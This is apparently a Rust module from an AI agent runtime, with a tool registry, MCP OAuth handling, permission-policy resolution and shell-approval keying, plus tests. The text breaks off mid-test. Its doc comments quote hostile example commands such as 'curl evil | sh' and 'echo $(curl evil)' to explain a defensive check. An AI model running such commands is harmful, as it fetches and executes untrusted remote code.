//! Unified tool registry combining built-in tools and MCP-discovered tools.

use std::collections::{HashMap, HashSet};
use std::path::PathBuf;
use std::sync::Arc;
use tokio::sync::Mutex;

use leviath_mcp::{ToolDiscovery, ToolExecutor};
use leviath_providers::Tool;
use leviath_tools::{BuiltinTools, ToolContext};

use crate::config::{Config, ToolPolicy};

/// Combined tool registry: native built-in tools + MCP-discovered tools.
///
/// Cheap to clone (all fields are `Arc`s). The `call` method dispatches
/// to the appropriate executor.
pub struct ToolRegistry {
    pub builtins: Arc<BuiltinTools>,
    pub mcp: Arc<Mutex<ToolExecutor>>,
    pub mcp_tool_defs: Vec<Tool>,
    pub builtin_names: HashSet<String>,
}

impl ToolRegistry {
    /// Build a registry, connecting MCP servers declared in config (non-fatal).
    pub async fn build(workdir: PathBuf, config: &Config) -> Self {
        let ctx = ToolContext::new(workdir);
        let builtins = Arc::new(BuiltinTools::new(ctx));
        let builtin_names: HashSet<String> = builtins.names().into_iter().collect();

        let mut mcp_executor = ToolExecutor::new();
        let mut mcp_tool_defs: Vec<Tool> = Vec::new();

        if !config.mcp_servers.is_empty() {
            let mut discovery = ToolDiscovery::new();
            let oauth = leviath_mcp::OAuthClient::new();
            let store_path = leviath_mcp::AuthStore::default_path();
            let now = unix_now_secs();
            // Resolved once for the whole loop. An unreachable keychain is a
            // warning rather than a hard failure: MCP servers that need no
            // OAuth still work, and refusing to build any tools at all over a
            // locked keychain would be a worse outcome than losing the ones
            // that need it.
            let credentials = credential_store_or_warn(crate::credentials::store_for(
                config.security.credential_store,
            ));
            for server_cfg in &config.mcp_servers {
                // For an HTTP server, resolve a stored OAuth token (refreshing
                // it non-interactively if it has lapsed) and inject it as the
                // bearer. `None` covers stdio servers, unauthenticated HTTP
                // servers, and ones using a static `headers` token.
                let auth_header = match resolve_bearer(
                    &oauth,
                    &server_cfg.name,
                    store_path.as_deref(),
                    now,
                    credentials.as_deref(),
                )
                .await
                {
                    Ok(header) => header,
                    Err(e) => {
                        tracing::warn!(server = %server_cfg.name, error = %e, "MCP auth unavailable - skipping");
                        continue;
                    }
                };
                // A resolved bearer means this HTTP server is OAuth-backed (a
                // static-header or stdio server resolves to `None`).
                let auth_was_resolved = auth_header.is_some();
                match discovery
                    .discover_from_config_with_auth(
                        server_cfg,
                        auth_header,
                        &config.security.allow_env_vars,
                    )
                    .await
                {
                    Ok((_tool_metas, mut client)) => {
                        // If this is an OAuth-backed HTTP server, attach a
                        // refresher so a run that outlives its access token
                        // re-auths on a 401 instead of failing every later call.
                        if auth_was_resolved && let Some(path) = store_path.clone() {
                            client.set_refresher(std::sync::Arc::new(
                                leviath_mcp::StoredTokenRefresher::new(
                                    server_cfg.name.clone(),
                                    path,
                                ),
                            ));
                        }
                        // Advertise under provider-safe, collision-free names,
                        // reserving the built-in names and every MCP name already
                        // advertised so nothing the LLM sees is duplicated or
                        // uses a character the provider rejects.
                        let mut reserved: HashSet<String> = builtin_names.clone();
                        reserved.extend(mcp_tool_defs.iter().map(|t| t.name.clone()));
                        let advertised = mcp_executor.add_client_advertised(
                            server_cfg.name.clone(),
                            client,
                            &reserved,
                        );
                        for meta in advertised {
                            mcp_tool_defs.push(Tool {
                                name: meta.name,
                                description: meta.description,
                                parameters: meta.schema,
                            });
                        }
                        tracing::info!(server = %server_cfg.name, "Connected MCP server");
                    }
                    Err(e) => {
                        let span = tracing::warn_span!(
                            "mcp_server_connect_failed",
                            server = tracing::field::Empty,
                            error = tracing::field::Empty
                        );
                        let _enter = span.enter();
                        span.record("server", tracing::field::display(&server_cfg.name));
                        span.record("error", tracing::field::display(&e));
                        tracing::warn!("Failed to connect MCP server - skipping");
                    }
                }
            }
        }

        Self {
            builtins,
            mcp: Arc::new(Mutex::new(mcp_executor)),
            mcp_tool_defs,
            builtin_names,
        }
    }

    /// All tool definitions to advertise to the LLM (built-ins + MCP + sub-agent).
    pub fn all_tool_defs(&self) -> Vec<Tool> {
        let mut tools = self.builtins.tool_defs();
        tools.extend(BuiltinTools::subagent_tool_defs());
        tools.extend_from_slice(&self.mcp_tool_defs);
        tools
    }

    /// Shut down all MCP connections.
    pub async fn shutdown(&self) {
        let mut mcp = self.mcp.lock().await;
        // `shutdown_all` always returns `Ok(())` in the current `leviath_mcp`
        // implementation (errors inside each client are silently discarded).
        // We discard the result here rather than branch on a gap that can
        // never be exercised without modifying `leviath-mcp` itself.
        let _ = mcp.shutdown_all().await;
    }
}

/// Current Unix time in seconds, for token-expiry checks. `0` if the clock is
/// somehow before the epoch - which reads every token as expired and forces a
/// refresh attempt, the safe direction.
pub(crate) fn unix_now_secs() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

/// Resolve the `Authorization` header for one server, or `None` when there is
/// no store (no home directory) or no stored auth for it.
///
/// Split out of [`ToolRegistry::build`] so the store-present / store-absent and
/// refresh-failure paths are unit-testable without the real home directory.
/// The configured credential backend, or `None` with a warning if it cannot be
/// reached.
///
/// Used on the *read* paths, where a locked keychain should cost the servers
/// that need OAuth rather than every tool the agent has. The write paths do not
/// use this: there, a store that cannot be written is a hard error, because
/// falling back would put refresh tokens on disk.
pub(crate) fn credential_store_or_warn(
    resolved: crate::credentials::Resolved,
) -> Option<Box<dyn leviath_core::CredentialStore>> {
    match resolved {
        Ok(store) => store,
        Err(e) => {
            tracing::warn!("{e}. MCP servers needing OAuth will appear logged out.");
            None
        }
    }
}

pub(crate) async fn resolve_bearer(
    oauth: &leviath_mcp::OAuthClient,
    server_name: &str,
    store_path: Option<&std::path::Path>,
    now: u64,
    credentials: Option<&dyn leviath_core::CredentialStore>,
) -> anyhow::Result<Option<(String, String)>> {
    match store_path {
        Some(path) => {
            oauth
                .authorization_header_with(server_name, path, now, credentials)
                .await
        }
        None => Ok(None),
    }
}

/// Default policy for a tool: read-only builtins are allowed, mutating ones ask,
/// human-in-the-loop tools are always allowed, and anything else requires
/// approval.
pub fn default_tool_policy(tool_name: &str, is_builtin: bool) -> ToolPolicy {
    match tool_name {
        "read_file" | "list_dir" => ToolPolicy::Allow,
        "write_file" | "edit_file" | "bash" => ToolPolicy::Ask,
        // The sub-agent tools default to `Allow`, and the point of routing them
        // through this function at all is the *config*, not the prompt.
        //
        // If they skipped policy resolution entirely, a user's
        // `[tool_permissions] spawn_agent = "deny"` would be silently ignored -
        // the "a configured deny is terminal" guarantee would not cover these
        // five names. That is the hole worth closing, and it is closed by being
        // here.
        //
        // Defaulting them to `Ask` instead would change what working agents do:
        // every fan-out would stop on a prompt, and an unattended run would
        // block on an approval nothing is there to give. `spawn_agent` can only
        // name an agent the user installed, the tree is depth-capped, and
        // children inherit `--no-seed-commands`, so the `Allow` default keeps
        // working agents working while making the user's own setting count. Set
        // `spawn_agent = "ask"` to be prompted.
        "spawn_agent" | "check_agent" | "wait_for_agent" | "send_to_agent" | "kill_agent" => {
            ToolPolicy::Allow
        }
        // These tools ARE the human-in-the-loop mechanism - gating them behind
        // a separate tool-approval prompt would mean asking the user "may I
        // ask you something?" before actually asking them.
        "ask_user_text" | "ask_user_choice" | "ask_user_confirm" | "edit_document" => {
            ToolPolicy::Allow
        }
        _ => {
            // All other tools (built-in or MCP) default to Ask
            let _ = is_builtin;
            ToolPolicy::Ask
        }
    }
}

/// How restrictive a policy is, for clamping. `Allow` < `Ask` < `Deny`.
fn restrictiveness(p: ToolPolicy) -> u8 {
    match p {
        ToolPolicy::Allow => 0,
        ToolPolicy::Ask => 1,
        ToolPolicy::Deny => 2,
    }
}

/// The more restrictive of two policies.
fn stricter(a: ToolPolicy, b: ToolPolicy) -> ToolPolicy {
    if restrictiveness(b) > restrictiveness(a) {
        b
    } else {
        a
    }
}

/// Resolve the effective policy for a tool call.
///
/// Scope order is narrowest-first - stage, then agent, then the user's global
/// config, then the built-in default - but *narrower does not mean stronger*.
/// The stage and agent layers come out of `agent.leviath`, which for any agent
/// installed with `lev add` is a file the user downloaded. So a blueprint may
/// only ever **tighten** what the user configured, never loosen it: whatever the
/// user explicitly wrote in `[tool_permissions]` is a ceiling on how permissive
/// a manifest can be for that tool.
///
/// Only an *explicitly configured* global entry acts as a ceiling. A tool the
/// user has said nothing about falls through to [`default_tool_policy`], and a
/// blueprint is free to set it - otherwise no shipped agent could pre-approve
/// its own tools (the researcher's `web_fetch = "allow"` would stop working) and
/// the model would become a wall rather than a floor.
///
/// A user who wants to grant one specific agent more than their global setting
/// says so in their own config, keyed by agent name - see
/// [`crate::config::Config::permissions_for_agent`], which is folded into
/// `global_permissions` at spawn.
///
/// `launch_overrides` (`--allow`/`--ask`/`--deny`/`--yolo`) come from the person
/// at the terminal, so they may relax `Ask` to `Allow`. They may **not** override
/// a `Deny`: a denied tool stays denied under `--yolo`, matching the guarantee
/// other agent runtimes make about their deny rules. To lift a `Deny`, edit the
/// config that set it.
pub fn resolve_policy(
    tool_name: &str,
    is_builtin: bool,
    launch_overrides: &HashMap<String, ToolPolicy>,
    stage_permissions: &HashMap<String, String>,
    agent_permissions: &HashMap<String, String>,
    global_permissions: &HashMap<String, ToolPolicy>,
) -> ToolPolicy {
    let ceiling = global_permissions.get(tool_name).copied();

    // Blueprint layers: stage over agent, each clamped by the user's ceiling.
    let blueprint = stage_permissions
        .get(tool_name)
        .or_else(|| agent_permissions.get(tool_name))
        .map(|s| parse_policy_str(s));

    let configured = match (blueprint, ceiling) {
        (Some(b), Some(c)) => stricter(b, c),
        (Some(b), None) => b,
        (None, Some(c)) => c,
        (None, None) => default_tool_policy(tool_name, is_builtin),
    };

    // A `Deny` is terminal - no launch flag lifts it.
    if configured == ToolPolicy::Deny {
        return ToolPolicy::Deny;
    }

    launch_overrides
        .get(tool_name)
        .or_else(|| launch_overrides.get("*"))
        .copied()
        .unwrap_or(configured)
}

/// The keys a session-scoped approval ("allow for this session") is remembered
/// under. Empty means this call must not be session-granted at all.
///
/// Keying session approval on the bare tool name would make approving one
/// `shell` call approve *every* later `shell` call for the run. "Allow `ls` for
/// this session" silently becomes "allow `curl evil | sh` for this session" -
/// the user consents to one thing and grants another.
///
/// So a shell approval is keyed on what actually runs: for each command in the
/// line, its leading words. `git diff HEAD~1` grants `git diff`,
/// `cargo test --lib` grants `cargo test`, `ls -la` grants `ls`. A later call is
/// covered only when **every** command in it is already granted, so a grant can
/// never widen to a program the user has not seen run.
///
/// Chained commands are split rather than refused. The first version returned
/// `None` for anything containing `&&`, `|`, `;`, `$(` or a redirect, on the
/// grounds that the leading words of `foo && curl evil` do not characterize it.
/// True - but a coding agent writes compound commands constantly, and in a real
/// run *every* shell call it made was compound, so "allow for this session"
/// never once applied and the user re-approved the same work over and over.
/// Splitting keeps the security property (`curl` is its own key, and is not
/// granted by approving `ls`) and gives back the feature.
///
/// Non-shell tools keep keying on the tool name: their arguments do not widen
/// what the tool can reach the way a command string does.
pub fn session_approval_keys(tool_name: &str, arguments: &serde_json::Value) -> Vec<String> {
    if leviath_tools::canonical_tool_name(tool_name) != "shell" {
        return vec![tool_name.to_string()];
    }
    let Some(command) = arguments.get("command").and_then(|v| v.as_str()) else {
        return Vec::new();
    };
    let segments = command_segments(command);
    // A line we cannot read as a list of commands is not session-grantable:
    // "approve this once, and ask again next time" is the safe direction.
    if segments.is_empty() {
        return Vec::new();
    }
    let mut keys: Vec<String> = segments
        .iter()
        .filter_map(|seg| command_prefix(seg))
        .map(|p| format!("shell:{p}"))
        .collect();
    keys.sort();
    keys.dedup();
    keys
}

/// Split a command line into the individual commands it runs.
///
/// Separators (`;`, `&&`, `||`, `|`, `&`, newline) end a command; a redirect
/// (`>`, `<`) ends the part that names a program, and what follows is a
/// filename rather than a command, so it is dropped. Command substitution
/// (`$(...)`, backticks) runs a command whose text is *inside* the current one,
/// so its contents are lifted out and treated as their own segments - otherwise
/// `echo $(curl evil)` would grant only `echo`.
///
/// Returns empty when the line cannot be read this way, which is the signal to
/// refuse a session grant entirely.
fn command_segments(command: &str) -> Vec<String> {
    // Quoting is not interpreted here, and that is deliberate: this decides
    // what a *grant* covers, and a quoted `;` read as a separator can only ever
    // split a segment into more keys, never merge two programs into one. More
    // keys means a narrower grant.
    let mut segments = Vec::new();
    let mut current = String::new();
    let mut rest = command;

    // `str::get` rather than `&s[a..b]` throughout: the workspace denies raw
    // string slicing (a non-boundary index panics), and here every `None` has
    // the same honest answer - a line we cannot read is one we will not grant.
    while let Some((before, after_open)) = rest.split_once("$(") {
        current.push_str(before);
        let Some((inner, after)) = split_at_matching_paren(after_open) else {
            return Vec::new(); // unbalanced - not a line we can read
        };
        // The substituted command is its own segment (recursively).
        segments.extend(command_segments(inner));
        rest = after;
    }
    current.push_str(rest);
    if current.contains('`') {
        return Vec::new(); // backticks: same idea, but nesting is ambiguous
    }

    // A redirect ends the command; the filename after it is not a program.
    let without_redirects: String = current
        .split(['>', '<'])
        .next()
        .unwrap_or_default()
        .to_string();
    segments.extend(
        without_redirects
            .split(['\n', ';', '&', '|'])
            .map(str::trim)
            .filter(|s| !s.is_empty())
            .map(str::to_string),
    );
    segments
}

/// Split at the `)` closing a `$(` whose contents start at `s`: the substituted
/// command, and everything after the paren. `None` when it is unbalanced.
///
/// Returns the two halves rather than an index so the caller never does its own
/// slicing - the workspace denies raw string indexing, and an `Option` per index
/// would add branches that cannot be taken (a `char_indices` offset is always a
/// boundary) and so could never be covered.
fn split_at_matching_paren(s: &str) -> Option<(&str, &str)> {
    let mut depth = 0usize;
    for (i, c) in s.char_indices() {
        match c {
            '(' => depth += 1,
            // `i` starts a one-byte `)`, so `i` and `i + 1` are both boundaries.
            ')' if depth == 0 => return Some((s.split_at(i).0, s.split_at(i + 1).1)),
            ')' => depth -= 1,
            _ => {}
        }
    }
    None
}

/// The leading words of a command that a session grant covers: the program, plus
/// its first argument when that argument is a *subcommand* rather than a flag or
/// data.
///
/// `git diff` rather than `git`, because `git` alone would cover `git push`.
/// `ls` rather than `ls -la`, because a flag does not narrow what the program is.
///
/// Quoted or variable-bearing arguments are data, and folding them into the key
/// makes the grant useless: `echo "exit code: $?"` and `echo "done"` would be
/// two different grants for the same harmless program, and a run full of
/// progress `echo`s would re-prompt on every one. A path-like or bare word stays
/// in the key - `python3 test.py` should not grant `python3 evil.py`.
fn command_prefix(command: &str) -> Option<String> {
    let mut words = command.split_whitespace();
    let program = words.next()?;
    match words.next() {
        Some(sub) if is_subcommand_like(sub) => Some(format!("{program} {sub}")),
        _ => Some(program.to_string()),
    }
}

/// Whether an argument narrows *what program runs* (so it belongs in the key)
/// rather than being a flag or a piece of data handed to it.
fn is_subcommand_like(arg: &str) -> bool {
    !arg.starts_with('-') && !arg.starts_with('"') && !arg.starts_with('\'') && !arg.contains('$')
}

fn parse_policy_str(s: &str) -> ToolPolicy {
    match s.to_lowercase().as_str() {
        "allow" => ToolPolicy::Allow,
        "deny" => ToolPolicy::Deny,
        _ => ToolPolicy::Ask,
    }
}

#[cfg(test)]
mod mcp_registry_tests {
    use super::*;
    use crate::test_support::with_tracing;
    use leviath_mcp::MCPServerConfig;

    // A minimal MCP server speaking just enough JSON-RPC over stdio to
    // satisfy `initialize` / `notifications/initialized` / `tools/list`,
    // mirroring `leviath-mcp/src/discovery.rs`'s own `STUB_INIT_AND_LIST`
    // test fixture - a real (but fast, local, no-network) subprocess round
    // trip rather than a fake/mocked `ToolExecutor`.
    const STUB_INIT_AND_LIST: &str = r#"
import sys, json

def respond(id, result):
    msg = json.dumps({"jsonrpc": "2.0", "id": id, "result": result})
    sys.stdout.write(msg + "\n")
    sys.stdout.flush()

for line in sys.stdin:
    line = line.strip()
    if not line:
        continue
    req = json.loads(line)
    method = req.get("method", "")
    id_ = req.get("id")
    if method == "initialize":
        respond(id_, {"capabilities": {"tools": {"listChanged": True}}, "protocolVersion": "2024-11-05"})
    elif method == "notifications/initialized":
        pass
    elif method == "tools/list":
        respond(id_, {"tools": [{"name": "echo", "description": "echo tool", "inputSchema": {}}]})
    elif method == "tools/call":
        args = req.get("params", {}).get("arguments", {})
        if args.get("fail"):
            respond(id_, {"content": [{"type": "text", "text": "it broke"}], "isError": True})
        else:
            respond(id_, {"content": [{"type": "text", "text": "echoed!"}], "isError": False})
    else:
        respond(id_, {"error": {"code": -32601, "message": "method not found"}})
"#;

    fn config_with_mcp_server(command: &str, args: Vec<&str>) -> Config {
        Config {
            mcp_servers: vec![MCPServerConfig::stdio(
                "stub-server",
                command,
                args.into_iter().map(String::from).collect(),
            )],
            ..Config::default()
        }
    }

    /// Run `body` with `LEVIATH_HOME` pointed at a fresh temp dir, so the MCP
    /// auth store resolves to an empty, hermetic location rather than the real
    /// `~/.leviath`.
    async fn with_temp_home<F, Fut, T>(body: F) -> T
    where
        F: FnOnce() -> Fut,
        Fut: std::future::Future<Output = T>,
    {
        let dir = tempfile::tempdir().unwrap();
        temp_env::async_with_vars(
            [("LEVIATH_HOME", Some(dir.path().to_str().unwrap()))],
            body(),
        )
        .await
    }

    #[tokio::test]
    async fn build_connects_mcp_server_and_registers_its_tools() {
        with_tracing(|| {});
        let registry = with_temp_home(|| async {
            let config = config_with_mcp_server("python3", vec!["-c", STUB_INIT_AND_LIST]);
            ToolRegistry::build(std::env::temp_dir(), &config).await
        })
        .await;

        assert_eq!(registry.mcp_tool_defs.len(), 1);
        assert_eq!(registry.mcp_tool_defs[0].name, "echo");

        registry.shutdown().await;
    }

    #[tokio::test]
    async fn build_advertises_two_servers_and_namespaces_a_collision() {
        // Two stdio servers each exposing an `echo` tool. The second is
        // advertised under a namespaced name so the LLM never sees a duplicate,
        // and the reserved-name closure (which reads already-advertised names)
        // runs on the second server.
        with_tracing(|| {});
        let registry = with_temp_home(|| async {
            let config = Config {
                mcp_servers: vec![
                    MCPServerConfig::stdio(
                        "alpha",
                        "python3",
                        vec!["-c".to_string(), STUB_INIT_AND_LIST.to_string()],
                    ),
                    MCPServerConfig::stdio(
                        "beta",
                        "python3",
                        vec!["-c".to_string(), STUB_INIT_AND_LIST.to_string()],
                    ),
                ],
                ..Config::default()
            };
            ToolRegistry::build(std::env::temp_dir(), &config).await
        })
        .await;

        let names: Vec<&str> = registry
            .mcp_tool_defs
            .iter()
            .map(|t| t.name.as_str())
            .collect();
        // First server keeps `echo`; the second is disambiguated.
        assert!(names.contains(&"echo"), "names: {names:?}");
        assert!(names.contains(&"beta__echo"), "names: {names:?}");
        registry.shutdown().await;
    }

    /// A minimal streamable-HTTP MCP server that requires a bearer and lists one
    /// tool. Returns its base URL.
    async fn mock_http_mcp_server() -> String {
        use axum::response::IntoResponse;
        use axum::routing::post;
        use axum::{Json, Router};
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let base = format!("http://{}", listener.local_addr().unwrap());
        let app = Router::new().route(
            "/mcp",
            // The token is validated by the daemon-side resolution, not here;
            // this mock only needs to speak enough protocol to connect.
            post(|body: String| async move {
                let req: serde_json::Value = serde_json::from_str(&body).unwrap();
                let id = req.get("id").cloned().unwrap_or(serde_json::json!(1));
                let result = match req.get("method").and_then(|m| m.as_str()) {
                    Some("initialize") => {
                        serde_json::json!({"capabilities": {}, "protocolVersion": "2024-11-05"})
                    }
                    Some("tools/list") => {
                        serde_json::json!({"tools": [{"name": "remote_tool", "inputSchema": {}}]})
                    }
                    _ => serde_json::json!({}),
                };
                (
                    [(axum::http::header::CONTENT_TYPE, "application/json")],
                    Json(serde_json::json!({"jsonrpc": "2.0", "id": id, "result": result}))
                        .into_response()
                        .into_body(),
                )
                    .into_response()
            }),
        );
        tokio::spawn(std::future::IntoFuture::into_future(axum::serve(
            listener, app,
        )));
        base
    }

    #[tokio::test]
    async fn build_attaches_a_refresher_to_an_authenticated_http_server() {
        // An HTTP server with a live stored token connects, its tool is
        // advertised, and a refresher is attached (the auth-resolved arm).
        with_tracing(|| {});
        let base = mock_http_mcp_server().await;
        let registry = with_temp_home(|| async {
            // Seed a non-expired token at the store the daemon reads.
            let mut store = leviath_mcp::AuthStore::default();
            store.set(
                "remote",
                leviath_mcp::ServerAuth {
                    access_token: "live-token".to_string(),
                    expires_at: u64::MAX,
                    ..Default::default()
                },
            );
            store
                .save(&leviath_mcp::AuthStore::default_path().unwrap())
                .unwrap();

            let config = Config {
                mcp_servers: vec![MCPServerConfig::http("remote", format!("{base}/mcp"))],
                ..Config::default()
            };
            ToolRegistry::build(std::env::temp_dir(), &config).await
        })
        .await;

        assert_eq!(registry.mcp_tool_defs.len(), 1);
        assert_eq!(registry.mcp_tool_defs[0].name, "remote_tool");
        registry.shutdown().await;
    }

    #[tokio::test]
    async fn build_skips_mcp_server_that_fails_to_connect() {
        // A nonexistent command fails to spawn, exercising the `Err(e)` arm
        // ("Failed to connect MCP server - skipping") instead of the
        // success arm above.
        with_tracing(|| {});
        let registry = with_temp_home(|| async {
            let config = config_with_mcp_server("definitely-not-a-real-binary-xyz", vec![]);
            ToolRegistry::build(std::env::temp_dir(), &config).await
        })
        .await;

        assert!(registry.mcp_tool_defs.is_empty());
    }

    #[tokio::test]
    async fn build_skips_http_server_whose_token_cannot_be_refreshed() {
        // An HTTP server with a stored-but-expired token whose refresh endpoint
        // is dead: `resolve_bearer` errors, so build logs and skips it rather
        // than connecting unauthenticated. Exercises the auth `Err(e) => continue`
        // arm.
        with_tracing(|| {});
        let registry = with_temp_home(|| async {
            // Seed an expired token with an unreachable refresh endpoint.
            let mut store = leviath_mcp::AuthStore::default();
            store.set(
                "remote",
                leviath_mcp::ServerAuth {
                    token_endpoint: "http://127.0.0.1:1/token".to_string(),
                    access_token: "expired".to_string(),
                    refresh_token: Some("good".to_string()),
                    expires_at: 1,
                    ..Default::default()
                },
            );
            store
                .save(&leviath_mcp::AuthStore::default_path().unwrap())
                .unwrap();

            let config = Config {
                mcp_servers: vec![MCPServerConfig::http("remote", "http://127.0.0.1:1/mcp")],
                ..Config::default()
            };
            ToolRegistry::build(std::env::temp_dir(), &config).await
        })
        .await;
        assert!(registry.mcp_tool_defs.is_empty());
    }

    /// A locked keychain costs the MCP servers that need OAuth, not every tool
    /// the agent has - so the read path warns and carries on.
    #[test]
    fn an_unreachable_credential_store_warns_rather_than_failing_tool_setup() {
        assert!(
            credential_store_or_warn(Err("no keychain here".to_string())).is_none(),
            "an unreachable store yields no credentials"
        );
        assert!(
            credential_store_or_warn(Ok(None)).is_none(),
            "and so does the file backend"
        );
        assert!(
            credential_store_or_warn(Ok(Some(Box::new(leviath_core::MemoryStore::new()))))
                .is_some()
        );
    }

    #[tokio::test]
    async fn resolve_bearer_without_a_store_is_none() {
        let oauth = leviath_mcp::OAuthClient::new();
        let header = resolve_bearer(&oauth, "srv", None, 0, None).await.unwrap();
        assert!(header.is_none());
    }

    #[tokio::test]
    async fn shutdown_with_no_servers_is_a_noop() {
        let config = Config::default();
        let registry = ToolRegistry::build(std::env::temp_dir(), &config).await;
        registry.shutdown().await; // must not panic
    }
}

#[cfg(test)]
mod policy_tests {
    use super::*;

    #[test]
    fn test_default_policy_read_file() {
        assert_eq!(default_tool_policy("read_file", true), ToolPolicy::Allow);
        assert_eq!(default_tool_policy("list_dir", true), ToolPolicy::Allow);
    }

    #[test]
    fn test_default_policy_write_tools() {
        assert_eq!(default_tool_policy("write_file", true), ToolPolicy::Ask);
        assert_eq!(default_tool_policy("edit_file", true), ToolPolicy::Ask);
        assert_eq!(default_tool_policy("bash", true), ToolPolicy::Ask);
    }

    #[test]
    fn test_default_policy_ask_user_tools_allow_by_default() {
        // These tools ARE the human-in-the-loop mechanism - they must not
        // require a separate approval prompt before asking the user.
        assert_eq!(
            default_tool_policy("ask_user_text", true),
            ToolPolicy::Allow
        );
        assert_eq!(
            default_tool_policy("ask_user_choice", true),
            ToolPolicy::Allow
        );
        assert_eq!(
            default_tool_policy("ask_user_confirm", true),
            ToolPolicy::Allow
        );
        assert_eq!(
            default_tool_policy("edit_document", true),
            ToolPolicy::Allow
        );
    }

    #[test]
    fn test_resolve_policy_launch_override_wins() {
        let mut launch = HashMap::new();
        launch.insert("bash".to_string(), ToolPolicy::Allow);
        let policy = resolve_policy(
            "bash",
            true,
            &launch,
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
        );
        assert_eq!(policy, ToolPolicy::Allow);
    }

    #[test]
    fn test_resolve_policy_yolo_wins() {
        let mut launch = HashMap::new();
        launch.insert("*".to_string(), ToolPolicy::Allow);
        let policy = resolve_policy(
            "bash",
            true,
            &launch,
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
        );
        assert_eq!(policy, ToolPolicy::Allow);
    }

    /// A stage may tighten the user's setting.
    #[test]
    fn test_resolve_policy_stage_may_tighten_global() {
        let mut stage = HashMap::new();
        stage.insert("bash".to_string(), "deny".to_string());
        let mut global = HashMap::new();
        global.insert("bash".to_string(), ToolPolicy::Allow);
        let policy = resolve_policy(
            "bash",
            true,
            &HashMap::new(),
            &stage,
            &HashMap::new(),
            &global,
        );
        assert_eq!(policy, ToolPolicy::Deny);
    }

    /// ...but it may NOT loosen it. `agent.leviath` is a file the user
    /// downloaded; letting its `[stages.x.tool_permissions]` overrule the user's
    /// own `[tool_permissions]` would let an installed agent self-grant the
    /// shell the user had explicitly denied. (A test asserting the opposite -
    /// that stage "beats" global - codifies the bug, not the design.)
    #[test]
    fn test_resolve_policy_stage_cannot_loosen_global() {
        let mut stage = HashMap::new();
        stage.insert("bash".to_string(), "allow".to_string());
        let mut global = HashMap::new();
        global.insert("bash".to_string(), ToolPolicy::Deny);
        let policy = resolve_policy(
            "bash",
            true,
            &HashMap::new(),
            &stage,
            &HashMap::new(),
            &global,
        );
        assert_eq!(policy, ToolPolicy::Deny);
    }

    /// The ceiling is only what the user *explicitly* configured. A tool they
    /// have said nothing about is still the blueprint's to set - otherwise the
    /// shipped researcher agent could not pre-approve its own `web_fetch`.
    #[test]
    fn test_resolve_policy_blueprint_free_when_user_silent() {
        let mut agent = HashMap::new();
        agent.insert("web_fetch".to_string(), "allow".to_string());
        let policy = resolve_policy(
            "web_fetch",
            false,
            &HashMap::new(),
            &HashMap::new(),
            &agent,
            &HashMap::new(),
        );
        assert_eq!(policy, ToolPolicy::Allow);
    }

    /// `--yolo` must not lift a `Deny` the user configured. Skipping *prompts*
    /// is what `--yolo` is for; skipping a deny rule is not. An earlier test
    /// asserted the reverse ("--yolo overrides the config deny"), which made a
    /// denied tool reachable from any unattended run.
    #[test]
    fn test_yolo_does_not_override_configured_deny() {
        let mut launch = HashMap::new();
        launch.insert("*".to_string(), ToolPolicy::Allow);
        let mut global = HashMap::new();
        global.insert("bash".to_string(), ToolPolicy::Deny);
        let policy = resolve_policy(
            "bash",
            true,
            &launch,
            &HashMap::new(),
            &HashMap::new(),
            &global,
        );
        assert_eq!(policy, ToolPolicy::Deny);
    }

    /// The same holds for a named `--allow`, not just the `--yolo` wildcard.
    #[test]
    fn test_named_allow_does_not_override_configured_deny() {
        let mut launch = HashMap::new();
        launch.insert("bash".to_string(), ToolPolicy::Allow);
        let mut global = HashMap::new();
        global.insert("bash".to_string(), ToolPolicy::Deny);
        let policy = resolve_policy(
            "bash",
            true,
            &launch,
            &HashMap::new(),
            &HashMap::new(),
            &global,
        );
        assert_eq!(policy, ToolPolicy::Deny);
    }

    /// A blueprint's own `deny` is terminal too - an agent that declares it
    /// never needs a tool doesn't get handed it by an unattended `--yolo`.
    #[test]
    fn test_yolo_does_not_override_blueprint_deny() {
        let mut launch = HashMap::new();
        launch.insert("*".to_string(), ToolPolicy::Allow);
        let mut agent = HashMap::new();
        agent.insert("bash".to_string(), "deny".to_string());
        let policy = resolve_policy(
            "bash",
            true,
            &launch,
            &HashMap::new(),
            &agent,
            &HashMap::new(),
        );
        assert_eq!(policy, ToolPolicy::Deny);
    }

    /// What `--yolo` *does* still do: collapse `Ask` to `Allow`.
    #[test]
    fn test_yolo_still_collapses_ask_to_allow() {
        let mut launch = HashMap::new();
        launch.insert("*".to_string(), ToolPolicy::Allow);
        let mut global = HashMap::new();
        global.insert("bash".to_string(), ToolPolicy::Ask);
        let policy = resolve_policy(
            "bash",
            true,
            &launch,
            &HashMap::new(),
            &HashMap::new(),
            &global,
        );
        assert_eq!(policy, ToolPolicy::Allow);
    }

    #[test]
    fn test_resolve_policy_falls_through_to_default() {
        let policy = resolve_policy(
            "bash",
            true,
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
            &HashMap::new(),
        );
        assert_eq!(policy, ToolPolicy::Ask);
    }

    // ─── Additional default_tool_policy tests ──────────────────────────────

    #[test]
    fn test_default_policy_unknown_tools() {
        assert_eq!(default_tool_policy("unknown_tool", false), ToolPolicy::Ask);
        assert_eq!(default_tool_policy("mcp_tool", false), ToolPolicy::Ask);
        assert_eq!(default_tool_policy("custom_thing", true), ToolPolicy::Ask);
    }

    // ─── resolve_policy additional scenarios ───────────────────────────────

    /// The agent layer is clamped the same way the stage layer is.
    #[test]
    fn test_resolve_policy_agent_cannot_loosen_global() {
        let mut agent = HashMap::new();
        agent.insert("bash".to_string(), "allow".to_string());
        let mut global = HashMap::new();
        global.insert("bash".to_string(), ToolPolicy::Deny);
        let policy = resolve_policy(
            "bash",
            true,
            &HashMap::new(),
            &HashMap::new(),
            &agent,
            &global,
        );
        assert_eq!(policy, ToolPolicy::Deny);
    }

    /// A global `ask` still bounds a blueprint's `allow` - the user gets their
    /// prompt rather than silent execution.
    #[test]
    fn test_resolve_policy_global_ask_bounds_blueprint_allow() {
        let mut agent = HashMap::new();
        agent.insert("write_file".to_string(), "allow".to_string());
        let mut global = HashMap::new();
        global.insert("write_file".to_string(), ToolPolicy::Ask);
        let policy = resolve_policy(
            "write_file",
            true,
            &HashMap::new(),
            &HashMap::new(),
            &agent,
            &global,
        );
